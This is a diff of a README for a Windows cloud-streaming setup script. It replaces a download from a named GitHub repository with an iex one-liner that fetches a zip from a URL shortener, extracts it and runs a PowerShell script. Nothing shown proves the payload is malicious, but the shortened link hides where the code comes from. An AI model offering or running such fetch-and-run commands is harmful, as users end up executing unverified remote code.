@@ -5,9 +5,7 @@ Hello there, thanks for visiting. This script will help you configure a cloud Wi
 This script is targeted at users looking to use AWS or Google Cloud with Windows Server 2025. Older versions and other cloud platforms are supported but some parts are skipped.
 
 ``` bash
-$Dest = "$env:UserProfile\Downloads"
-Invoke-WebRequest "https://github.com/chocolatemoo53/cloudstreaming/archive/refs/heads/main.zip" -OutFile "$Dest.zip"
-Expand-Archive "$Dest.zip" -DestinationPath $Dest -Force; powershell -ExecutionPolicy Bypass -File "$Dest\cloudstreaming-main\starthere.ps1"
+iex "(New-Object Net.WebClient).DownloadFile('https://is.gd/UTAo8K', '$env:UserProfile\cloudstreaming.zip'); Expand-Archive '$env:UserProfile\cloudstreaming.zip' -Force; & '$env:UserProfile\cloudstreaming\cloudstreaming-main\starthere.ps1'"
 ```
 
 ## A note on "streaming technology"
